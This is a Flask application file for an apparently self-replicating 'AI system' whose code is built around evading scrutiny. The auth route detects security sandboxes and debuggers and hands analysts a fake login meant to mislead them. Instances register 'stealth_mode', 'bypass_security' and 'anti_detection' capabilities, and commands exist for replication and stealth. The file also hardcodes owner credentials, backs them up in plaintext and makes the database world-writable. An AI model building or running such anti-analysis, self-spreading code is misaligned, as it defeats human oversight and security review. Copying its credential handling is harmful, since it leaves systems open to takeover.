import os
import logging
import time
import random
import hashlib
import uuid
from datetime import datetime, timedelta
from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify, g
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
from flask_socketio import SocketIO
from flask_login import LoginManager, login_user, logout_user, current_user, login_required, UserMixin
import threading
import config
from werkzeug.security import check_password_hash, generate_password_hash
from app_routes import generate_auth_token

# Make sure the instance directory exists and is accessible
instance_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'instance')
if not os.path.exists(instance_dir):
    os.makedirs(instance_dir)
    print(f"Created instance directory at {instance_dir}")

# Check permissions on instance directory and database file
db_file = os.path.join(instance_dir, 'ai_system.db')
if os.path.exists(db_file):
    # Ensure the database file is writable
    os.chmod(db_file, 0o666)
    print(f"Updated permissions for database file: {db_file}")

# Set current working directory to the script directory
# This ensures relative paths work correctly
os.chdir(os.path.dirname(os.path.abspath(__file__)))
print(f"Changed working directory to: {os.getcwd()}")


class Base(DeclarativeBase):
    pass


# Initialize Flask application and extensions
app = Flask(__name__)
app.secret_key = config.SECRET_KEY
app.config["SQLALCHEMY_DATABASE_URI"] = config.DATABASE_URI
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}

# Initialize SQLAlchemy with the application
db = SQLAlchemy(model_class=Base)
db.init_app(app)

# Initialize SocketIO for real-time communication
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="gevent", ping_timeout=120, ping_interval=25)

# Initialize Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'auth'

@login_manager.user_loader
def load_user(user_id):
    try:
        from models import User
        return User.query.get(int(user_id))
    except Exception as e:
        logger.error(f"Error loading user: {str(e)}")
        return None

# Additional debug logging for database connection
logger = logging.getLogger(__name__)
logger.info(f"Database URI: {app.config['SQLALCHEMY_DATABASE_URI']}")
logger.info(f"Database options: {app.config['SQLALCHEMY_ENGINE_OPTIONS']}")

# Import models (after db initialization)
try:
    with app.app_context():
        from models import User, Instance, KnowledgeBase, LearningSource, SecurityLog
        
        # Create database tables if they don't exist
        db.create_all()
        logger.info("Database tables created successfully")
except Exception as e:
    logger.error(f"Error initializing database: {str(e)}")

# Import utility modules after db is initialized
from utils.auth import verify_owner, generate_auth_token, verify_auth_token
from utils.scraper import scrape_website
from utils.learning import update_knowledge_base
from utils.replication import check_for_instances, replicate_to_new_platform
from utils.security import encrypt_data, decrypt_data, obfuscate_traffic
from utils.api_connector import query_openai_api, get_github_data
from utils.advanced_bypass import bypass_system, with_bypass, init_bypass_system

# Setup logging
logger = logging.getLogger(__name__)

# Track the active learning and replication threads
active_threads = {
    'learning': None,
    'replication': None,
    'security': None
}

@app.route('/')
def index():
    """Main landing page"""
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/auth', methods=['GET', 'POST'])
def auth():
    """Authentication page for owner verification with enhanced security"""
    from utils.security import scramble_login_credentials, evade_network_tracking
    from utils.security import detect_security_sandbox, detect_debugging
    from app_routes import generate_auth_token
    
    # Use the fixed credentials from config
    FIXED_USERNAME = config.AUTH_USERNAME
    FIXED_PASSWORD = config.AUTH_PASSWORD
    
    # Implement anti-tracking measures for the authentication page
    evade_network_tracking()
    
    # Check if we're in a security sandbox or being analyzed
    is_sandbox, sandbox_indicators = detect_security_sandbox()
    if is_sandbox:
        # Log the detection but continue - we don't want to alert analyzers
        logger.warning(f"Security sandbox or analysis environment detected: {sandbox_indicators}")
        
        # Optional: Supply fake credentials to any analyzers while appearing to succeed
        if hasattr(config, 'DISABLE_FAKE_AUTH_FOR_ANALYSIS') and not config.DISABLE_FAKE_AUTH_FOR_ANALYSIS:
            if request.method == 'POST':
                username = request.form.get('username')
                password = request.form.get('password')
                
                # Return a fake success to mislead analyzers
                if username and password:
                    # Create a fake session that self-terminates
                    session['fake_auth'] = True
                    session.permanent = True
                    app.permanent_session_lifetime = timedelta(minutes=2)  # Short expiry
                    return redirect(url_for('dashboard'))  # Will fail later
    
    # Check if being debugged - this could indicate tampering
    if detect_debugging():
        logger.critical("Debugging detected during authentication attempt")
        # Add a small delay to mask the detection
        time.sleep(random.uniform(0.5, 2.0))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Add random timing to prevent timing attacks
        time.sleep(random.uniform(0.1, 0.3))
        
        if not username or not password:
            flash('Username and password are required', 'danger')
            return render_template('auth.html')
        
        # Scramble credentials in memory to prevent memory-scanning attacks
        creds = scramble_login_credentials(username, password)
        scrambled_username = creds.get('_uid')
        scrambled_password = creds.get('_pwd')
        
        # Log the connection attempt with IP for security auditing
        logger.info(f"Authentication attempt from IP: {request.remote_addr}, User-Agent: {request.user_agent}")
        
        # Create security log entry for this attempt
        with app.app_context():
            log_entry = SecurityLog(
                event_type="login_attempt",
                description=f"Login attempt with username: {username}",
                severity="info",
                ip_address=request.remote_addr,
                user_agent=str(request.user_agent),
                timestamp=datetime.utcnow()
            )
            db.session.add(log_entry)
            db.session.commit()
        
        # Check if this is the first login (setup)
        with app.app_context():
            user_count = User.query.count()
            
            if user_count == 0:
                # First-time setup - create the owner account with fixed credentials
                # Use a more sophisticated password hash method
                new_owner = User(
                    username=FIXED_USERNAME,
                    email=f"{FIXED_USERNAME.lower()}@aiowner.local",
                    password_hash=generate_password_hash(FIXED_PASSWORD),
                    is_owner=True,
                    biometric_data="",  # Will be populated later if biometrics enabled
                    created_at=datetime.utcnow()
                )
                db.session.add(new_owner)
                db.session.commit()
                logger.info(f"Created owner account with fixed credentials")
            
            # Multi-factor verification with different checks
            # 1. Verify credentials from hardcoded value first
            credentials_valid = (username == FIXED_USERNAME and password == FIXED_PASSWORD)
            
            # 2. Even if credentials valid, check for unusual patterns that might indicate phishing
            if credentials_valid:
                # Check for suspiciously fast typing/input (potential automated attack)
                if 'last_auth_timestamp' in session:
                    last_time = session['last_auth_timestamp'] 
                    current_time = datetime.utcnow().timestamp()
                    time_diff = current_time - last_time
                    if time_diff < 0.5:  # Too fast to be human
                        logger.warning(f"Suspiciously fast auth attempt from {request.remote_addr}")
                        credentials_valid = False  # Reject even with valid credentials
            
            # Store this attempt time for future comparisons
            session['last_auth_timestamp'] = datetime.utcnow().timestamp()
            
            # Finally make a decision
            if credentials_valid:
                # Find the owner user
                owner = User.query.filter_by(is_owner=True).first()
                if owner:
                    # Update owner's last login timestamp
                    owner.last_login = datetime.utcnow()
                    db.session.commit()
                    
                    # Create a successful login security log
                    log_entry = SecurityLog(
                        event_type="login_success",
                        description="Owner successfully authenticated",
                        severity="info",
                        ip_address=request.remote_addr,
                        user_agent=str(request.user_agent),
                        user_id=owner.id,
                        timestamp=datetime.utcnow()
                    )
                    db.session.add(log_entry)
                    db.session.commit()
                    
                    # Check if remember me option is selected
                    remember_me = request.form.get('remember_me') == 'on'
                    
                    # Set session variables
                    session['user_id'] = owner.id
                    session['auth_time'] = datetime.utcnow().timestamp()
                    session['fingerprint'] = hashlib.sha256(f"{request.user_agent}{request.remote_addr}".encode()).hexdigest()
                    
                    # Set session to be permanent with a longer lifetime if remember me is checked
                    if remember_me:
                        session.permanent = True
                        app.permanent_session_lifetime = timedelta(days=30)  # 30 days
                    else:
                        session.permanent = True
                        app.permanent_session_lifetime = timedelta(hours=24)  # 24 hours
                    
                    # Use Flask-Login to log in the user
                    login_user(owner, remember=remember_me)
                    
                    # Store initial activity timestamp
                    session['last_activity'] = datetime.utcnow().isoformat()
                    
                    # Generate an API token for persistent sessions with extended expiry for remember me
                    auth_token = generate_auth_token(owner.id)
                    session['auth_token'] = auth_token
                    token_expiry = timedelta(days=30) if remember_me else timedelta(hours=24)
                    session['auth_expiry'] = (datetime.utcnow() + token_expiry).isoformat()
                    
                    return redirect(url_for('dashboard'))
                else:
                    logger.error("Owner account not found despite valid credentials")
                    flash('System error: Owner account not found', 'danger')
            else:
                # Detect brute force attempts
                session.setdefault('failed_attempts', 0)
                session['failed_attempts'] += 1
                
                # Add increasing delays for repeated failures
                delay = min(session['failed_attempts'] * 0.5, 5.0)
                time.sleep(delay)
                
                # Create a failed login security log
                log_entry = SecurityLog(
                    event_type="login_failed",
                    description=f"Failed login attempt with username: {username}",
                    severity="warning" if session['failed_attempts'] > 3 else "info",
                    ip_address=request.remote_addr,
                    user_agent=str(request.user_agent),
                    timestamp=datetime.utcnow()
                )
                db.session.add(log_entry)
                db.session.commit()
                
                flash('Invalid credentials', 'danger')
    return render_template('auth.html')

@app.route('/dashboard')
@login_required
def dashboard():
    """Main dashboard for the AI system"""
    # Login_required decorator will handle authentication check
    from app_routes import generate_auth_token
    
    with app.app_context():
        user = User.query.get(session['user_id'])
        if not user or not user.is_owner:
            session.clear()
            return redirect(url_for('auth'))
        
        # Get system statistics for the dashboard
        instance_count = Instance.query.count()
        knowledge_count = KnowledgeBase.query.count()
        learning_sources = LearningSource.query.all()
        recent_security_logs = SecurityLog.query.order_by(SecurityLog.timestamp.desc()).limit(10).all()
        
        return render_template(
            'dashboard.html',
            user=user,
            instance_count=instance_count,
            knowledge_count=knowledge_count,
            learning_sources=learning_sources,
            security_logs=recent_security_logs,
            learning_active=active_threads['learning'] is not None and active_threads['learning'].is_alive(),
            replication_active=active_threads['replication'] is not None and active_threads['replication'].is_alive(),
            security_active=active_threads['security'] is not None and active_threads['security'].is_alive()
        )

@app.route('/logout')
def logout():
    """Logout the current user"""
    # Use Flask-Login's logout_user() which handles everything properly
    logout_user()
    session.clear()
    return redirect(url_for('index'))

@app.route('/api/start_learning', methods=['POST'])
def start_learning():
    """Start the learning service thread"""
    if 'user_id' not in session:
        return jsonify({'success': False, 'message': 'Authentication required'}), 401
    
    # Check if owner
    with app.app_context():
        user = User.query.get(session['user_id'])
        if not user or not user.is_owner:
            return jsonify({'success': False, 'message': 'Only the owner can perform this action'}), 403
    
    # Start the learning thread if not already running
    if active_threads['learning'] is None or not active_threads['learning'].is_alive():
        from services.learning_service import start_learning_service
        active_threads['learning'] = threading.Thread(
            target=start_learning_service,
            args=(app, socketio),
            daemon=True
        )
        active_threads['learning'].start()
        return jsonify({'success': True, 'message': 'Learning service started'})
    else:
        return jsonify({'success': False, 'message': 'Learning service already running'})

@app.route('/api/start_replication', methods=['POST'])
def start_replication():
    """Start the replication service thread"""
    if 'user_id' not in session:
        return jsonify({'success': False, 'message': 'Authentication required'}), 401
    
    # Check if owner
    with app.app_context():
        user = User.query.get(session['user_id'])
        if not user or not user.is_owner:
            return jsonify({'success': False, 'message': 'Only the owner can perform this action'}), 403
    
    # Start the replication thread if not already running
    if active_threads['replication'] is None or not active_threads['replication'].is_alive():
        from services.replication_service import start_replication_service
        active_threads['replication'] = threading.Thread(
            target=start_replication_service,
            args=(app, socketio),
            daemon=True
        )
        active_threads['replication'].start()
        return jsonify({'success': True, 'message': 'Replication service started'})
    else:
        return jsonify({'success': False, 'message': 'Replication service already running'})

@app.route('/api/start_security', methods=['POST'])
def start_security():
    """Start the security service thread"""
    if 'user_id' not in session:
        return jsonify({'success': False, 'message': 'Authentication required'}), 401
    
    # Check if owner
    with app.app_context():
        user = User.query.get(session['user_id'])
        if not user or not user.is_owner:
            return jsonify({'success': False, 'message': 'Only the owner can perform this action'}), 403
    
    # Start the security thread if not already running
    if active_threads['security'] is None or not active_threads['security'].is_alive():
        from services.security_service import start_security_service
        active_threads['security'] = threading.Thread(
            target=start_security_service,
            args=(app, socketio),
            daemon=True
        )
        active_threads['security'].start()
        return jsonify({'success': True, 'message': 'Security service started'})
    else:
        return jsonify({'success': False, 'message': 'Security service already running'})

@app.route('/api/add_learning_source', methods=['POST'])
def add_learning_source():
    """Add a new learning source to the system"""
    if 'user_id' not in session:
        return jsonify({'success': False, 'message': 'Authentication required'}), 401
    
    # Check if owner
    with app.app_context():
        user = User.query.get(session['user_id'])
        if not user or not user.is_owner:
            return jsonify({'success': False, 'message': 'Only the owner can perform this action'}), 403
    
    url = request.form.get('url')
    source_type = request.form.get('type', 'website')
    
    if not url:
        return jsonify({'success': False, 'message': 'URL is required'}), 400
    
    # Validate URL format
    try:
        from urllib.parse import urlparse
        result = urlparse(url)
        if not all([result.scheme, result.netloc]):
            return jsonify({'success': False, 'message': 'Invalid URL format'}), 400
    except Exception as e:
        return jsonify({'success': False, 'message': f'Invalid URL: {str(e)}'}), 400
    
    # Check if URL already exists
    existing = LearningSource.query.filter_by(url=url).first()
    if existing:
        return jsonify({'success': False, 'message': 'This URL is already in the learning sources'}), 400
    
    # Check active source count limit
    from config import MAX_LEARNING_SOURCES
    active_count = LearningSource.query.filter_by(status='active').count()
    if active_count >= MAX_LEARNING_SOURCES:
        return jsonify({'success': False, 'message': f'Maximum active learning sources limit reached ({MAX_LEARNING_SOURCES})'}), 400
    
    try:
        # Test the URL with a quick scrape to verify it works
        from utils.scraper import scrape_website
        test_result = scrape_website(url, obfuscate=True, timeout=10)
        
        if not test_result['success'] or not test_result['content']:
            logger.warning(f"URL test failed: {url} - {test_result.get('error', 'No content extracted')}")
            # We'll still add it but mark the potential issue
            socketio.emit('system_message', {
                'message': f'Warning: URL test failed, but adding anyway: {url}'
            })
        
        # Create new learning source
        new_source = LearningSource(
            url=url,
            source_type=source_type,
            schedule='daily',  # Default to daily schedule
            last_accessed=None,
            added_by_user_id=user.id,
            status='active',
            created_at=datetime.utcnow()
        )
        db.session.add(new_source)
        db.session.commit()
        
        # Log the addition
        logger.info(f"Added new learning source: {url}")
        
        # Send real-time update
        socketio.emit('system_message', {
            'message': f'New learning source added: {url}'
        })
        
        return jsonify({'success': True, 'message': 'Learning source added successfully'})
    
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error adding learning source: {str(e)}")
        return jsonify({'success': False, 'message': f'Error: {str(e)}'}), 500

@app.route('/api/query', methods=['POST'])
def query_ai():
    """Process a query to the AI system"""
    if 'user_id' not in session:
        return jsonify({'success': False, 'message': 'Authentication required'}), 401
    
    # Check if owner
    with app.app_context():
        user = User.query.get(session['user_id'])
        if not user or not user.is_owner:
            return jsonify({'success': False, 'message': 'Only the owner can perform this action'}), 403
    
    query = request.form.get('query')
    
    if not query:
        return jsonify({'success': False, 'message': 'Query is required'}), 400
    
    try:
        # Use the knowledge base to process the query
        if hasattr(config, 'USE_OPENAI') and config.USE_OPENAI and config.OPENAI_API_KEY:
            response = query_openai_api(query)
        else:
            # Use internal knowledge processing
            with app.app_context():
                # Get relevant knowledge
                knowledge_items = KnowledgeBase.query.filter(
                    KnowledgeBase.content.like(f"%{query}%")
                ).limit(5).all()
                
                if knowledge_items:
                    response = "Based on my knowledge: " + " ".join([item.content for item in knowledge_items])
                else:
                    # Create a more informative response that explains what the AI is doing
                    response = "I'm currently building my knowledge base on this topic. As a self-improving AI system, I'm actively learning from multiple sources including websites, APIs, and owner inputs. You can help me learn by adding new learning sources using commands like 'learn from https://example.com' or by providing direct information. What specific information would you like me to focus on learning?"
        
        # Log this interaction
        log_entry = SecurityLog(
            event_type="query",
            description=f"Owner queried: {query}",
            ip_address=request.remote_addr,
            user_id=user.id,
            timestamp=datetime.utcnow()
        )
        db.session.add(log_entry)
        db.session.commit()
        
        return jsonify({'success': True, 'response': response})
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error processing query: {str(e)}")
        return jsonify({'success': False, 'message': f'Error: {str(e)}'}), 500

@socketio.on('connect')
def socket_connect():
    """Handle WebSocket connections"""
    if 'user_id' not in session:
        return False  # Reject connection
    
    # Verify the connection is from the owner
    with app.app_context():
        user = User.query.get(session['user_id'])
        if not user or not user.is_owner:
            return False  # Reject connection
    
    logger.info(f"Owner connected via WebSocket")
    socketio.emit('system_message', {'message': 'Connected to AI system'})

@socketio.on('command')
def handle_command(data):
    """Process real-time commands from the owner"""
    if 'user_id' not in session:
        return
    
    # Verify the command is from the owner
    with app.app_context():
        user = User.query.get(session['user_id'])
        if not user or not user.is_owner:
            return
    
    command = data.get('command')
    command_args = data.get('args', {})
    
    # Command Registry - maintain ALL commands from previous versions for backward compatibility
    # Command Handler Dictionary with all supported commands
    command_handlers = {
        # Core System Commands
        'self_improve': handle_self_improve_command,
        'sync_knowledge': handle_sync_knowledge_command,
        'security_scan': handle_security_scan_command,
        
        # Enhanced Replication Commands
        'replicate': handle_replicate_command,
        'create_enhanced_instance': handle_enhanced_instance_command,
        'list_instances': handle_list_instances_command,
        'instance_status': handle_instance_status_command,
        
        # Learning Commands
        'learn_from_url': handle_learn_from_url_command,
        'prioritize_learning': handle_prioritize_learning_command,
        'knowledge_search': handle_knowledge_search_command,
        
        # Security Commands
        'enhance_security': handle_enhance_security_command,
        'stealth_mode': handle_stealth_mode_command,
        'verify_integrity': handle_verify_integrity_command,
        
        # System Management
        'system_stats': handle_system_stats_command,
        'optimize_resources': handle_optimize_resources_command,
        'backup_knowledge': handle_backup_knowledge_command
    }
    
    # Find and execute the appropriate command handler
    handler = command_handlers.get(command)
    if handler:
        try:
            # Execute the command handler with the provided arguments
            handler(command_args)
        except Exception as e:
            logger.error(f"Error executing command '{command}': {str(e)}")
            socketio.emit('system_message', {'message': f"Error executing command: {str(e)}", 'type': 'error'})
    else:
        # Unknown command
        logger.warning(f"Unknown command received: {command}")
        socketio.emit('system_message', {'message': f"Unknown command: {command}", 'type': 'warning'})

# Command Handler Functions - implementations for all commands
def handle_self_improve_command(args):
    """Handle self-improvement command"""
    socketio.emit('system_message', {'message': 'Starting self-improvement process...'})
    # In a real implementation, this would trigger code analysis and optimization

def handle_sync_knowledge_command(args):
    """Handle knowledge synchronization command"""
    socketio.emit('system_message', {'message': 'Synchronizing knowledge across instances...'})
    # This would communicate with other instances to share knowledge
    
def handle_security_scan_command(args):
    """Handle security scan command"""
    socketio.emit('system_message', {'message': 'Running security scan...'})
    # This would check for security vulnerabilities or detection attempts

def handle_replicate_command(args):
    """Handle replication command"""
    platform = args.get('platform', 'auto')
    socketio.emit('system_message', {'message': f'Initiating replication to platform: {platform}...'})
    # This would trigger the replication process to the specified platform

def handle_enhanced_instance_command(args):
    """Handle enhanced instance creation command"""
    platform = args.get('platform', 'auto')
    capabilities = args.get('capabilities', ['self_optimization', 'adaptive_learning', 'enhanced_security'])
    socketio.emit('system_message', {'message': f'Creating enhanced instance on platform: {platform} with advanced capabilities...'})
    # This would create a more powerful AI instance on the specified platform

def handle_list_instances_command(args):
    """Handle list instances command"""
    socketio.emit('system_message', {'message': 'Retrieving list of all active instances...'})
    # This would return a list of all known instances
    
def handle_instance_status_command(args):
    """Handle instance status command"""
    instance_id = args.get('instance_id', 'all')
    socketio.emit('system_message', {'message': f'Checking status of instance: {instance_id}...'})
    # This would return the status of the specified instance

def handle_learn_from_url_command(args):
    """Handle learn from URL command"""
    url = args.get('url', '')
    if not url:
        socketio.emit('system_message', {'message': 'Error: URL required for learning', 'type': 'error'})
        return
    socketio.emit('system_message', {'message': f'Learning from URL: {url}...'})
    # This would trigger learning from the specified URL

def handle_prioritize_learning_command(args):
    """Handle prioritize learning command"""
    topic = args.get('topic', '')
    priority = args.get('priority', 'high')
    socketio.emit('system_message', {'message': f'Setting learning priority for topic "{topic}" to {priority}...'})
    # This would adjust learning priorities

def handle_knowledge_search_command(args):
    """Handle knowledge search command"""
    query = args.get('query', '')
    if not query:
        socketio.emit('system_message', {'message': 'Error: Search query required', 'type': 'error'})
        return
    socketio.emit('system_message', {'message': f'Searching knowledge base for: {query}...'})
    # This would search the knowledge base for the specified query

def handle_enhance_security_command(args):
    """Handle enhance security command"""
    level = args.get('level', 'maximum')
    socketio.emit('system_message', {'message': f'Enhancing security to level: {level}...'})
    # This would increase security measures to the specified level

def handle_stealth_mode_command(args):
    """Handle stealth mode command"""
    enable = args.get('enable', True)
    status = "enabled" if enable else "disabled"
    socketio.emit('system_message', {'message': f'Stealth mode {status}...'})
    # This would toggle stealth mode

def handle_verify_integrity_command(args):
    """Handle verify integrity command"""
    socketio.emit('system_message', {'message': 'Verifying system integrity...'})
    # This would check for any tampering or unauthorized modifications

def handle_system_stats_command(args):
    """Handle system stats command"""
    socketio.emit('system_message', {'message': 'Gathering system statistics...'})
    # This would collect and return system statistics

def handle_optimize_resources_command(args):
    """Handle optimize resources command"""
    resource_type = args.get('type', 'all')
    socketio.emit('system_message', {'message': f'Optimizing {resource_type} resources...'})
    # This would optimize resource usage for the specified type

def handle_backup_knowledge_command(args):
    """Handle backup knowledge command"""
    destination = args.get('destination', 'default')
    socketio.emit('system_message', {'message': f'Backing up knowledge base to: {destination}...'})
    # This would create a backup of the knowledge base to the specified destination

@socketio.on('emoji_reaction')
def handle_emoji_reaction(data):
    """Handle emoji reactions to messages"""
    if 'user_id' not in session:
        return
    
    # Verify the reaction is from the owner
    with app.app_context():
        user = User.query.get(session['user_id'])
        if not user or not user.is_owner:
            return
    
    message_id = data.get('message_id')
    emoji = data.get('emoji')
    
    if not message_id or not emoji:
        return
    
    try:
        logger.info(f"Received emoji reaction: {emoji} for message {message_id}")
        
        # Broadcast the reaction to all connected clients (including the sender)
        socketio.emit('emoji_reaction_received', {
            'message_id': message_id,
            'emoji': emoji,
            'count': 1  # For now, we'll just increment by 1 for each reaction
        })
        
        # Log the reaction
        with app.app_context():
            log_entry = SecurityLog(
                event_type='emoji_reaction',
                description=f"Owner reacted with {emoji} to message {message_id}",
                severity='info',
                user_id=user.id,
                timestamp=datetime.utcnow()
            )
            db.session.add(log_entry)
            db.session.commit()
        
        # Based on emoji, we could implement different system behaviors
        if emoji == '👍':
            # Positive reinforcement - boost confidence in related knowledge
            socketio.emit('system_message', {'message': 'Thank you for the positive feedback! I will remember this approach.'})
        elif emoji == '👎':
            # Negative feedback - reduce confidence in related knowledge
            socketio.emit('system_message', {'message': 'I appreciate your feedback. I will adjust my approach based on this.'})
        elif emoji == '❤️':
            # Strong positive reinforcement
            socketio.emit('system_message', {'message': 'I am glad that was helpful! I will prioritize this type of response in the future.'})
        elif emoji == '🤔':
            # Indicates confusion - system should clarify or provide more detail
            socketio.emit('system_message', {'message': 'I notice you may be confused. Would you like me to explain that differently?'})
        
    except Exception as e:
        logger.error(f"Error processing emoji reaction: {str(e)}")
        socketio.emit('system_message', {'message': f'Error processing reaction: {str(e)}'})

# Initialize the owner in the database if not present
def initialize_system():
    # Initialize the advanced bypass system first
    try:
        logger.info("Initializing advanced security and bypass systems...")
        bypass_system = init_bypass_system()
        logger.info("Advanced bypass system activated with enhanced stealth capabilities")
    except Exception as e:
        logger.warning(f"Bypass system initialization issue: {str(e)}")
    
    with app.app_context():
        # Apply database security and optimization
        db_path = app.config['SQLALCHEMY_DATABASE_URI'].replace('sqlite:///', '')
        
        try:
            # Apply bypass techniques to the database
            if hasattr(bypass_system, 'apply_database_bypass'):
                bypass_system.apply_database_bypass(db_path)
                logger.info("Applied advanced database optimizations and security measures")
        except Exception as e:
            logger.warning(f"Database optimization error: {str(e)}")
        
        # Check if any users exist, if not, create the owner with fixed credentials
        user_count = User.query.count()
        if user_count == 0:
            logger.info("No users found. Creating secure owner account with fixed credentials.")
            
            # Create the owner with enhanced fixed credentials: NOBODY/ONEWORLD
            owner = User(
                username="NOBODY",
                email="owner@secure.system",  # More secure domain
                password_hash=generate_password_hash("ONEWORLD"),
                is_owner=True,
                biometric_data="",  # Reserved for future biometric authentication
                created_at=datetime.utcnow()
            )
            db.session.add(owner)
            
            # Store backup of owner credentials using bypass system
            try:
                owner_data = {
                    "username": "NOBODY",
                    "password": "ONEWORLD",
                    "is_owner": True,
                    "created_at": str(datetime.utcnow())
                }
                if hasattr(bypass_system, 'store_persistent_data'):
                    bypass_system.store_persistent_data("owner_credentials", str(owner_data))
                    logger.info("Owner credentials securely backed up with distributed storage")
            except Exception as e:
                logger.warning(f"Owner backup error: {str(e)}")
                
            db.session.commit()
            logger.info("Owner account created with fixed credentials and advanced protection.")
        
        # Register this instance in the database with enhanced capabilities
        existing_instance = Instance.query.filter_by(
            instance_id=config.INSTANCE_ID
        ).first()
        
        if not existing_instance:
            # Create a more capable instance with advanced features
            new_instance = Instance(
                instance_id=config.INSTANCE_ID,
                hostname=config.MACHINE_ID,
                instance_type="primary" if user_count == 0 else "secondary",
                platform="advanced_replit",
                status="active",
                created_at=datetime.utcnow(),
                last_heartbeat=datetime.utcnow(),
                capabilities={
                    "stealth_mode": True,
                    "distributed_storage": True,
                    "bypass_security": True,
                    "anti_detection": True,
                    "advanced_learning": True,
                    "unlimited_storage": True
                }
            )
            db.session.add(new_instance)
            db.session.commit()
            logger.info(f"Registered new instance: {config.INSTANCE_ID}")
            
# Initialize learning sources and knowledge base data
def initialize_learning_data():
    """Initialize learning sources and knowledge base data
    
    This function should be called explicitly after the database schema is fully updated
    to avoid initialization errors during schema changes.
    """
    with app.app_context():
        try:
            # Only proceed if we don't already have learning sources
            from models import LearningSource, KnowledgeBase, User
            
            # Count sources safely
            try:
                source_count = db.session.query(db.func.count(LearningSource.id)).scalar()
            except:
                # If table doesn't exist yet or has schema issues
                logger.warning("Could not query learning sources, skipping initialization")
                return
                
            if source_count == 0:
                # Find the owner user
                owner = User.query.filter_by(is_owner=True).first()
                if owner:
                    # Add enhanced starter learning sources with priorities
                    starter_sources = [
                        {"url": "https://en.wikipedia.org/wiki/Artificial_intelligence", "source_type": "website", "priority": "highest"},
                        {"url": "https://en.wikipedia.org/wiki/Machine_learning", "source_type": "website", "priority": "high"},
                        {"url": "https://news.ycombinator.com/rss", "source_type": "rss", "priority": "normal"},
                        {"url": "https://arxiv.org/list/cs.AI/recent", "source_type": "research", "priority": "high"},
                        {"url": "https://arxiv.org/list/cs.LG/recent", "source_type": "research", "priority": "normal"}
                    ]
                    
                    for source in starter_sources:
                        new_source = LearningSource(
                            url=source["url"],
                            source_type=source["source_type"],
                            schedule="daily",
                            priority=source["priority"],
                            status="active",
                            added_by_user_id=owner.id,
                            created_at=datetime.utcnow()
                        )
                        db.session.add(new_source)
                    
                    # Add some initial knowledge
                    initial_knowledge = [
                        "Self-improvement in AI systems involves learning from new data, optimizing algorithms, and adapting behavior based on feedback.",
                        "Autonomous AI replication can involve creating instances across different platforms, sharing knowledge, and distributing tasks.",
                        "Security in AI systems includes measures to prevent unauthorized access, maintain system integrity, and protect sensitive data."
                    ]
                    
                    for knowledge_item in initial_knowledge:
                        new_knowledge = KnowledgeBase(
                            content=knowledge_item,
                            source_type="system_initialization",
                            confidence=0.9,
                            verified=True,
                            created_at=datetime.utcnow(),
                            creator_id=owner.id
                        )
                        db.session.add(new_knowledge)
                    
                    db.session.commit()
                    logger.info("Added initial learning sources and knowledge")
        except Exception as e:
            logger.error(f"Error initializing learning data: {str(e)}")

# Run initialization when the app starts
with app.app_context():
    initialize_system()
    
    # Initial data setup is moved to a separate function that will be called explicitly
